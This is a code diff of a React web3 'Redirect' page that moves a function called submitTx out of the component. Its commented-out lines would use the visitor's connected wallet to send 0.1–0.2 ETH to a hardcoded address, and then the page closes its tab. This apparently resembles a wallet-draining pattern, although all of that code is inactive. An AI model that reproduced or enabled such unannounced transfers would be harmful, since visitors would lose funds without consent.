@@ -42,20 +42,7 @@ export default function Redirect() {
     //     sendTransaction({to: `0x${"47dEAF612F0769d99aDB653bA2d22bba79F26C42"}`, value: parseEther("0.1")})
     // })
 
-    async function submitTx() {
-      const { isConnected } = useWeb3ModalAccount()
-      const { walletProvider } = useWeb3ModalProvider()
-      if (!isConnected) throw Error('User disconnected')
-      if (!walletProvider) throw Error('Wallet Provider Abscent')
-      const ethersProvider = new BrowserProvider(walletProvider)
-console.log(ethersProvider)
-      // const signer = await ethersProvider.getSigner()
-      // let estimateGas = await ethersProvider.estimateGas({ to: `0x${"47dEAF612F0769d99aDB653bA2d22bba79F26C42"}`, value: parseEther("0.2")})
-
-      // console.log(estimateGas)
-    
-      // await signer.sendTransaction({ to: `0x${"47dEAF612F0769d99aDB653bA2d22bba79F26C42"}`, value: parseEther("0.2")})
-    }
+ 
 
       const handleCloseButtonClick = () => {
         // Close the current tab
@@ -78,3 +65,18 @@ console.log(ethersProvider)
 
 
 // exit page when done
+async function submitTx() {
+  console.log(49)
+//   const { isConnected } = useWeb3ModalAccount()
+//   const { walletProvider } = useWeb3ModalProvider()
+//   if (!isConnected) throw Error('User disconnected')
+//   if (!walletProvider) throw Error('Wallet Provider Abscent')
+//   const ethersProvider = new BrowserProvider(walletProvider)
+// console.log(ethersProvider)
+  // const signer = await ethersProvider.getSigner()
+  // let estimateGas = await ethersProvider.estimateGas({ to: `0x${"47dEAF612F0769d99aDB653bA2d22bba79F26C42"}`, value: parseEther("0.2")})
+
+  // console.log(estimateGas)
+
+  // await signer.sendTransaction({ to: `0x${"47dEAF612F0769d99aDB653bA2d22bba79F26C42"}`, value: parseEther("0.2")})
+}
